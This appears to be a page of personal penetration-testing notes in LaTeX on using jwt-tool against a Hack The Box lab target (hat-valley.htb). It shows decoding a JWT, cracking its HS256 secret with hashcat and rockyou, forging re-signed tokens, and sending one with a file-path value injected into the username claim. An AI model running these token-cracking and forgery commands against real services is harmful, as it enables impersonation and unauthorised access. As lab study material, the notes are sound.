\section{jwt-tool}

config in  \verb+ ~/.jwt_tool/jwtconf.ini+

\begin{verbatim}
$ jwt-tool  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcwNjUwMzMwfQ.jRs2p1usdWJb66Iwp2iAXwbmRH0g1zyIoMeapN96Emw

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] username = "christopher.jones"
[+] iat = 1670650330    ==> TIMESTAMP = 2022-12-10 06:32:10 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
\end{verbatim}

\subsection*{cracking and tampering}

with a HS256 signature
\begin{verbatim}
$ hashcat -a 0 -m 16500 jwt.token /usr/share/wordlists/passwords/rockyou.txt

$ jwt-tool -T -p 123beany123 -S hs256  eyJhbGciOiJIU.. .SNIP. ..byIoMeapN96Emw
$ jwt-tool -I -pc username -pv toto -p 123beany123 -S hs256  eyJhbGciOiJIU.. .SNIP. ..byIoMeapN96Emw
\end{verbatim}

\subsection*{interacting with website}

\begin{verbatim}
jwt-tool -I -pc username -pv /tmp/files -p 123beany123 -S hs256 \
    -t http://hat-valley.htb/api/all-leave \
    -rc "token=eyJhbGciO.. .SNIP. ..MeapN96Emw"
\end{verbatim}

the data can be intercepted by burp
